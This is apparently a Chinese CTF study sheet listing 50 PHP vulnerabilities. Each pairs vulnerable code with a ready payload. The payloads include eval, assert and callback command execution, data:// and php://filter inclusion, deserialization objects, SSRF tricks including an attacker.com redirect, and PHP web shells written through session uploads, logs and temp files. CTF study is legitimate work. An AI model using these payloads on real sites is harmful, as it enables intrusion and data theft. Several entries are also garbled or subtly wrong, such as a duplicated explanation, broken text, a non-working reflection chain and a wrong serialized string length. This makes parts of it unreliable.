# CTF PHP 漏洞与实战案例


## 1. intval() 传数组返回 1
原理与分析：intval() 对非空数组返回 1，因此即使输入不是数字，只要传入数组就能让 intval 返回非零值，从而绕过基于数值判断的条件
```
if (isset($_GET['num'])) {
    if (intval($_GET['num'])) {
        echo $flag;
    }
}
```
```
?num[]=1
```
---
## 2. preg_match() 传数组返回 false
原理与分析：preg_match() 要求第一个参数是字符串，若传入数组会返回 false；在黑名单过滤逻辑中，这可使条件判断失效，从而绕过限制
```
if (preg_match('/flag/', $_GET['input'])) {
    die("no");
}
echo $flag;
```
```
?input[]=anything
```
---
## 3. intval($str, 0) 自动识别进制
原理与分析：当 intval() 的第二个参数为 0 时，会自动根据前缀识别进制，如 "0x4d2" 被解析为十六进制 1234；由于它是字符串，可绕过 !== "1234" 的严格比较
```
if ($_GET['num'] !== "1234") {
    if (intval($_GET['num'], 0) === 1234) {
        echo $flag;
    }
}
```
```
?num=0x4d2
```
---
## 4. md5() 弱比较：0e 开头视为 0
原理与分析：当 intval() 的第二个参数为 0 时，会自动根据前缀识别进制，如 "0x4d2" 被解析为十六进制 1234；由于它是字符串，可绕过 !== "1234" 的严格比较
```
if (md5($_GET['a']) == md5($_GET['b'])) {
    echo $flag;
}
```
```
?a=s878926199a&b=s1091221200a
```

## 5. md5() 传数组返回 NULL，强比较成立
原理与分析：md5() 无法处理数组，传入数组时返回 NULL；两个 NULL 在强比较（===）下相等，因此可绕过要求哈希值完全相同的验证
```
if (md5($_GET['a']) === md5($_GET['b'])) {
    echo $flag;
}
```
```
?a[]=1&b[]=2
```
---
## 6. strcmp() 遇数组返回 NULL，松散比较为 0
原理与分析：strcmp() 只能比较字符串，传入数组会返回 NULL；而 NULL 在松散比较中等于 0，因此可绕过密码验证等逻辑
```
if (strcmp($_GET['password'], "admin") == 0) {
    echo $flag;
}
```
```
?password[]=1
```
---
## 7. strpos() 被 %00 或换行绕过（过滤与执行不一致）
原理与分析：strpos() 用于检测敏感词，但如果后端用它做黑名单而实际包含函数（如 include）能处理完整路径，则可通过 php://filter 等协议绕过字面匹配，读取源码
```
if (strpos($_GET['file'], 'flag') === false) {
    include($_GET['file']);
}
```
```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```
---
## 8. file_get_contents() + php://filter 读源码
原理与分析：php://filter 是只读流包装器，可对文件内容进行 Base64 编码输出而不执行 PHP 代码，适用于在 file_get_contents 等函数中读取源码而非执行
```
echo file_get_contents($_GET['page']);
```
```
?page=php://filter/read=convert.base64-encode/resource=flag.php
```
---
## 9. unserialize() 触发 __destruct()
原理与分析：反序列化对象时，PHP 会自动调用其魔术方法，如 __destruct() 在脚本结束时执行；若该方法中包含文件读取或命令执行，即可被利用获取 flag
```
class Flag {
    public $file = 'index.php';
    public function __destruct() {
        echo file_get_contents($this->file);
    }
}
unserialize($_GET['data']);
```
```
?data=O:4:"Flag":1:{s:4:"file";s:5:"/flag";}
```
---
## 10. eval() 直接代码执行
原理与分析：eval() 会将传入的字符串作为 PHP 代码直接执行，属于高危函数；攻击者可借此执行任意系统命令或读取文件
```
eval($_GET['cmd']);
```
```
?cmd=system('cat /flag');
```
---
## 11. call_user_func() 动态调用函数导致 RCE
原理与分析：call_user_func() 第一个参数为函数名，第二个为参数，若两者均可控，攻击者可指定 func 为 system、exec 等危险函数，实现任意命令执行
```
call_user_func($_GET['func'], $_GET['arg']);
```
```
?func=system&arg=cat+/flag
```
---
## 12. preg_replace() 使用 /e 修饰符（PHP < 5.5.0）
原理与分析：在 PHP 5.5.0 之前，preg_replace() 的 /e 修饰符会将替换字符串当作 PHP 代码执行；攻击者可传入恶意代码直接触发 RCE。
```
echo preg_replace('/(.*)/e', $_GET['cmd'], 'test');
```
```
?cmd=system('cat /flag')
```
---
## 13. parse_str() 导致变量覆盖
原理与分析：parse_str() 会将查询字符串解析为变量并注册到当前作用域，若未指定目标数组，可能覆盖已有变量（如 $auth），从而提升权限
```
$auth = 0;
parse_str($_GET['data']);
if ($auth == 1) {
    echo $flag;
}
```
```
?data=auth=1
```
## 14. str_replace() 双写绕过过滤
原理与分析：str_replace() 默认只替换一次，攻击者可通过双写敏感词（如 flflagag），使替换后仍保留有效 payload（删除中间 flag 后剩下 fl+ag=flag）
```
$input = str_replace('flag', '', $_GET['str']);
if ($input === 'flag') {
    echo $flag;
}
```
```
?str=flflagag
```
## 15. in_array() 松散比较导致 0 匹配任意字符串
原理与分析：in_array() 默认使用松散比较（==），当传入数字 0 时，PHP 会将数组中的字符串（如 'admin'）转换为数字 0 进行比较，结果为 true，从而绕过角色验证

题目代码
```
if (in_array($_GET['role'], ['admin', 'user'])) {
    echo $flag;
}
```
```
?role=0
```
---

## 16. is_numerics()接受科学计数法和十六进制
原理与分析：is_numeric() 不仅接受普通数字，还接受科学计数法（如 1e6）和十六进制（如 0x10）等格式；因此可传入 1e6（等于 1000000）绕过数值大小判断，同时满足 is_numeric 条件
```
if (is_numeric($_GET['id']) && $_GET['id'] > 999999) {
    echo $flag;
}
```
```
?id=1e6
```
---
## 17. array_search() 松散比较导致 0 匹配字符串
原理与分析：array_search() 默认使用松散比较（==），当传入 name=0 时，数组中的字符串（如 'alice'）会被转换为 0 进行比较，结果为 true，从而返回有效索引，绕过验证
```
if (array_search($_GET['name'], ['alice', 'bob']) !== false) {
    echo $flag;
}
```
```
?name=0
```
---
## 18. extract() 导入变量覆盖本地变量
原理与分析：extract() 会将数组的键作为变量名导入当前作用域，若直接从  
G
​
 ET调用，攻击者可通过参数名覆盖已有关键变量（如admin），从而提升权限
```
$admin = false;
extract($_GET);
if ($admin) {
    echo $flag;
}
```
```
?admin=1
```
---
## 19. parse_url() 对 127.1 解析为 localhost
原理与分析：IP 地址 127.1 是合法简写形式，等价于 127.0.0.1；在 SSRF 场景中，若后端仅检查 host 是否为 'localhost'，可用 127.1 绕过部分校验并访问本地服务
```
$url = parse_url($_GET['url']);
if ($url['host'] === 'localhost') {
    echo file_get_contents($_GET['url']);
}
```
```
?url=http://127.1/flag.php
```
---
## 20. json_decode() + unserialize() 二次反序列化

原理与分析：程序先用 json_decode 解析用户输入，再对其中某个字段进行 unserialize；攻击者可在 JSON 中嵌入序列化对象，触发反序列化漏洞
```
$data = json_decode($_GET['data'], true);
unserialize($data['payload']);
```
```
?data={"payload":"O:4:\"Flag\":1:{s:4:\"file\";s:5:\"\/flag\";}"}
```
---

## 21. assert() 执行字符串代码（PHP < 7.2）
原理与分析：在 PHP 7.2 之前，assert() 支持将字符串当作 PHP 代码执行；若传入可控参数，可直接执行 system 等函数，造成远程代码执行
```
assert($_GET['code']);
```
```
?code=system('cat /flag');
```
---

## 22. create_function() 代码注入（PHP < 7.2）
原理与分析：create_function() 内部使用 eval 拼接代码，格式为 eval("function() {{$code}}")；攻击者可通过闭合大括号并注入代码（如 };system(...);/*）实现 RCE
```
$func = create_function('', $_GET['code']);
$func();
```
```
?code=};system('cat+/flag');/*
```
---
##23. hex2bin() + eval() 执行十六进制编码代码
原理与分析：hex2bin() 将十六进制字符串还原为原始 PHP 代码，配合 eval 可隐藏恶意 payload；适用于绕过关键字检测
```
eval(hex2bin($_GET['cmd']));
```
```
?cmd=73797374656d2827636174202f666c616727293b
```
---
## 24. scandir() 列出目录文件
原理与分析：scandir('.') 返回当前目录下所有文件和文件夹名称，常用于发现隐藏的 flag 文件（如 flag.php、.flag 等），是信息泄露类题目的典型利用方式
```
print_r(scandir('.'));
```
```
（无参数，直接访问）
```
---
## 25. get_headers() 引发 SSRF
原理与分析：get_headers() 会向指定 URL 发起 HTTP 请求，虽不返回响应体，但可用于探测内网端口或触发内部服务（如 Redis、管理后台），属于 SSRF 漏洞的一种利用方式
```
get_headers($_GET['url']);
echo "Request sent.";
```
```
?url=http://127.0.0.1:8080/admin
```
---
## 26. session.upload_progress 写入临时 session 文件
原理与分析：PHP 在上传过程中会将进度信息写入 session 文件（路径通常为 /tmp/sess_xxx），若 session 名可控且存在文件包含点，可将 Webshell 写入 session 并包含执行
```
// 无显式代码，依赖配置和包含点
```
```
POST /?PHPSESSID=exploit HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```
## 27. glob:// 协议列目录（PHP >= 5.3）
原理与分析：glob:// 流包装器支持通配符匹配文件路径，在 file_get_contents、include 等函数中可用于列出目录内容，辅助发现 flag 文件
```
foreach (glob($_GET['pattern']) as $file) {
    echo "$file\n";
}
```
```
?pattern=/var/www/html/*.php
```
---
## 28. zip:// 协议包含压缩包内文件
原理与分析：zip:// 可读取 ZIP 压缩包内的特定文件，若网站允许上传 ZIP 且存在文件包含漏洞，可将 PHP Webshell 打包后通过 zip:// 触发执行
```
include($_GET['file']);
```
```
?file=zip://shell.zip%23x.php
```
---
## 29. data:// 协议执行 Base64 编码代码
原理与分析：data:// 协议允许以内联方式提供数据，结合 text/plain 和 base64 编码，可在 include 或 file_get_contents 中执行任意 PHP 代码
```
include($_GET['file']);
```
```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```
---
## 30. __toString() 在对象转字符串时触发
原理与分析：当一个对象被当作字符串使用（如拼接、echo）时，PHP 会自动调用其 __toString() 方法；在反序列化或字符串操作场景中，可利用该方法触发文件读取或命令执行
```
class Trigger {
    public $data = "/flag";
    public function __toString() {
        return file_get_contents($this->data);
    }
}
echo $_GET['input'] . new Trigger();
```
```
?input=anything
```
---
## 31. array_diff() 松散比较导致类型混淆
原理与分析：array_diff() 使用松散比较（==）判断元素是否相等，当数组中包含数字 0 和字符串（如 "admin"）时，0 == "admin" 为 true，可能导致意外的差集结果，绕过逻辑判断
```
if (empty(array_diff(['admin'], [$_GET['role']]))) {
    echo $flag;
}
```
```
?role=0
```
---
## 32. switch 无 break 导致逻辑穿透
原理与分析：PHP 的 switch 语句若某个 case 缺少 break，会继续执行后续 case；攻击者可利用此特性，通过传入低权限选项触发高权限逻辑
```
switch ($_GET['action']) {
    case 'guest':
        echo "Guest";
    case 'admin':
        echo $flag;
}
```
```
?action=guest
```
---
## 33. trim() 移除首尾空白及 0x00-0x1F 字符
原理与分析：trim() 默认不仅移除空格，还会移除 ASCII 0x00 到 0x1F 的控制字符（包括制表符、换行等），若用于过滤后再进行严格比较，可能因前后不一致导致绕过
```
if (trim($_GET['token']) === "secret") {
    echo $flag;
}
```
```
?token=%09secret
```
---
## 34. array_keys() + in_array() 绕过键名校验
原理与分析：若程序只检查值是否在白名单，但实际使用的是数组键，攻击者可构造键为恶意值、值为白名单项的数组，绕过 in_array 检查
```
$input = $_GET['data'];
if (in_array($input, ['safe'])) {
    echo $$input;
}
```
```
?data[safe]=anything
```
---
## 35. $$ 变量变量导致变量覆盖
原理与分析：会将变量的值作为另一个变量名，若用户可控输入用于，可间接读取或覆盖任意变量（如 $flag）
```
$name = $_GET['name'];
echo $$name;
```
```
?name=flag
```
---
## 36. header() SSRF + 302 跳转绕过
原理与分析：若程序用 header() 跳转到用户提供的 URL，且后端有 SSRF 检测但未处理跳转，攻击者可设置一个外网跳板页 302 到内网地址，绕过 host 校验
```
header("Location: " . $_GET['url']);
```
```
?url=http://attacker.com/redirect_to_localhost
```
---
## 37. error_log() 记录敏感信息（信息泄露）
原理与分析：error_log() 会将内容写入日志文件，若日志路径可读且记录了 flag 或用户输入，可能造成信息泄露
```
error_log("User input: " . $_GET['input']);
```
```
?input=<?php system($_GET['cmd']); ?>
```
---
## 38. highlight_file() 直接读取并高亮源码
原理与分析：highlight_file() 会读取并以语法高亮形式输出 PHP 源码，常用于调试，但若暴露给用户可直接获取 flag 所在文件内容
```
highlight_file($_GET['file']);
```
```
?file=flag.php
```
---
## 39. show_source() 同 highlight_file()
原理与分析：show_source() 是 highlight_file() 的别名，功能完全相同，可直接读取并显示 PHP 源码
```
show_source($_GET['page']);
```
```
?page=index.php
```
---
## 40. filter_var() FILTER_VALIDATE_IP 绕过
原理与分析：filter_var($ip, FILTER_VALIDATE_IP) 在某些版本中会接受 0x7F000001（十六进制 IP）或 127.1 等格式，可用于绕过 IP 白名单校验
```
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP) && $_GET['ip'] !== '127.0.0.1') {
    echo file_get_contents("http://".$_GET['ip']);
}
```
```
?ip=0x7F000001
```
---
## 41. ctype_digit() 只接受纯数字字符串
原理与分析：ctype_digit() 对负数、小数、科学计数法均返回 false，但对 "0"、"123" 返回 true；若用于 ID 校验，可能被误认为安全，但结合其他漏洞（如 SQL 注入）仍可利用
```
if (ctype_digit($_GET['id'])) {
    $sql = "SELECT * FROM users WHERE id = ".$_GET['id'];
}
```
```
?id=1 and 1=1
```
---
## 42. array_merge() 覆盖数字索引
原理与分析：array_merge() 在合并数组时，数字索引会被重新排序，而字符串键会保留；若程序依赖特定索引顺序，可能被意外覆盖或打乱逻辑

```
$defaults = ['role' => 'user', 'active' => false];
$user = array_merge($defaults, $_GET['config']);
if ($user['role'] === 'admin') echo $flag;
```
```
?config[role]=admin
```
---
## 43. ReflectionClass 读取私有属性

```
class Secret {
    private $flag = "CTF{...}";
}
$ref = new ReflectionClass('Secret');
$obj = $ref->newInstance();
echo $ref->getProperty('flag')->setAccessible(true)->getValue($obj);
```
```
（无需参数，代码本身即漏洞）
```
---
## 44. ob_start() + callback RCE
原理与分析：ob_start() 可接受回调函数，输出缓冲结束时会调用该函数处理内容；若回调函数名可控，可指定为 system 等危险函数

```
ob_start($_GET['func']);
echo "id";
ob_end_flush();
```
```
?func=system
```
---
## 45. register_shutdown_function() 执行延迟函数
原理与分析：register_shutdown_function() 在脚本终止时执行指定函数，若函数名和参数可控，可实现延迟命令执行

```
register_shutdown_function($_GET['func'], $_GET['arg']);
```
```
?func=system&arg=cat+/flag
```
---
## 46. array_map() 执行回调函数
原理与分析：array_map() 将回调函数应用到数组每个元素，若回调函数名来自用户输入，可调用危险函数

```
array_map($_GET['func'], [$_GET['arg']]);
```
```
?func=system&arg=cat+/flag
```
---
## 47. extract() + $$ 组合变量覆盖
原理与分析：extract() 导入变量后，若再使用 $$ 动态变量，攻击者可通过一次传参覆盖多个变量或间接读取敏感变量

```
extract($_GET);
echo $$var;
```
```
?var=flag
```
---
## 48. parse_ini_string() 解析用户输入配置
原理与分析：parse_ini_string() 将字符串解析为配置数组，若输入可控且结果用于敏感操作（如数据库连接），可能被注入恶意配置
```
$config = parse_ini_string($_GET['ini']);
if ($config['debug'] == 'on') echo $flag;
```
```
?ini=debug=on
```
---
## 49. tempnam() + file_put_contents() 写临时文件
原理与分析：若程序将用户输入写入 tempnam() 创建的临时文件，且该文件路径可预测或被包含，可实现 Webshell 写入

```
$tmp = tempnam('/tmp', 'upload');
file_put_contents($tmp, $_GET['content']);
```
```
?content=<?php system($_GET['cmd']); ?>
```
---
## 50. __wakeup() 反序列化时自动触发
原理与分析：当对象被反序列化时，PHP 会自动调用 __wakeup() 方法；若该方法中包含危险操作（如文件读取、命令执行），可被利用获取 flag

```
class Exploit {
    public $cmd = "cat /flag";
    public function __wakeup() {
        system($this->cmd);
    }
}
unserialize($_GET['data']);
```
```
?data=O:7:"Exploit":1:{s:3:"cmd";s:8:"cat /flag";}
```
---